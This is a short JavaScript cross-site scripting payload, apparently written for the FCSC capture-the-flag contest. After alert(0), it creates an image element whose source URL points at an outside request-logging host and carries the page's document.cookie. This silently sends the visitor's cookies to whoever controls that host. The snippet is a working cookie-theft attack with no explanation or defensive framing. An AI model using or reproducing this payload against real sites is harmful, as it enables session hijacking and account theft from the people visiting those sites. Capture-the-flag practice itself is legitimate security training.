alert(0) // CTF FCSC

var i = document.createElement("img");
var ngrok = "http://v1.requestbin.net/r/h4zjh2wq"; // FIXME ngrok
i.src = ngrok + "/?leak="+encodeURIComponent(document.cookie);
